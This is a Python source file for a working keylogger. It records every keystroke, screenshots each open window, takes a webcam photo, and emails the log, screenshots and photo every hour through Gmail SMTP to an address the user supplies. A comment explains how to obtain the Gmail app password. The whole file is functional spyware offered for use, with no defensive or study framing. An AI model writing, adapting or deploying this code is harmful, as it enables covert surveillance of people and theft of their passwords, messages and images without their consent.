from pynput.keyboard import Key, Listener
import logging
import smtplib
import schedule
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import pygetwindow as gw 
import pyautogui
import cv2
import os


desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
log_dir = os.path.join(desktop_path, "KeyLoggerLogs")


os.makedirs(log_dir, exist_ok=True)


sender_email = "SENDER INFO HERE"
receiver_email = "RECEIVER INFO HERE"
email_password = "EMAIL 16 DIGIT PASSWORD" # You can get it in google under security/secure app. Simply have 2step ON. Make an app, give it a name, and get the 16 digit password, no spaces.
smtp_server = "smtp.gmail.com"
smtp_port = 587

logging.basicConfig(filename=(os.path.join(log_dir, "key_log.txt")), level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    if key == Key.ctrl_l or key == Key.ctrl_r:
        return
    elif key == Key.esc:
        return False
    else:
        logging.info(str(key))


def take_webcam_picture():
    print("Turning on webcam and allowing it to adjust...")
    cap = cv2.VideoCapture(0)  # 0 for built-in camera, 1 for USB


    time.sleep(5)

    print("Capturing picture from webcam...")


    ret, frame = cap.read()
    cap.release()


    webcam_picture_path = os.path.join(log_dir, "webcam_picture.jpg")
    cv2.imwrite(webcam_picture_path, frame)

    print(f"Webcam picture saved: {webcam_picture_path}")
    return webcam_picture_path


def send_email():
    print("Sending email...")


    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Keys Logged, Screenshots, and Webcam Picture on Desktop"
    message.attach(MIMEText("Find the logfile, screenshots, and webcam picture within"))


    with open(os.path.join(log_dir, "key_log.txt"), "rb") as file:
        attachment = MIMEBase("application", "octet-stream")
        attachment.set_payload(file.read())
        encoders.encode_base64(attachment)
        attachment.add_header("Content-Disposition", "attachment", filename="key_log.txt")
        message.attach(attachment)


    for i, window in enumerate(gw.getAllTitles()):
        screenshot = pyautogui.screenshot(region=(gw.getWindowsWithTitle(window)[0].left,
                                                  gw.getWindowsWithTitle(window)[0].top,
                                                  gw.getWindowsWithTitle(window)[0].width,
                                                  gw.getWindowsWithTitle(window)[0].height))
        screenshot_path = os.path.join(log_dir, f"screenshot_{i+1}.png")
        screenshot.save(screenshot_path)

        with open(screenshot_path, "rb") as screenshot_file:
            screenshot_attachment = MIMEBase("application", "octet-stream")
            screenshot_attachment.set_payload(screenshot_file.read())
            encoders.encode_base64(screenshot_attachment)
            screenshot_attachment.add_header("Content-Disposition", "attachment", filename=f"screenshot_{i+1}.png")
            message.attach(screenshot_attachment)


    webcam_picture_path = take_webcam_picture()
    with open(webcam_picture_path, "rb") as webcam_picture_file:
        webcam_attachment = MIMEBase("application", "octet-stream")
        webcam_attachment.set_payload(webcam_picture_file.read())
        encoders.encode_base64(webcam_attachment)
        webcam_attachment.add_header("Content-Disposition", "attachment", filename="webcam_picture.jpg")
        message.attach(webcam_attachment)


    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender_email, email_password)
            server.send_message(message)
        print("Email sent successfully.")
    except smtplib.SMTPAuthenticationError:
        print("Failed to log in to SMTP. Check your email credentials.")
    except Exception as e:
        print(f"Error sending email: {e}")


schedule.every().hour.do(send_email)

with Listener(on_press=on_press):
    while True:

        schedule.run_pending()
        time.sleep(3600)
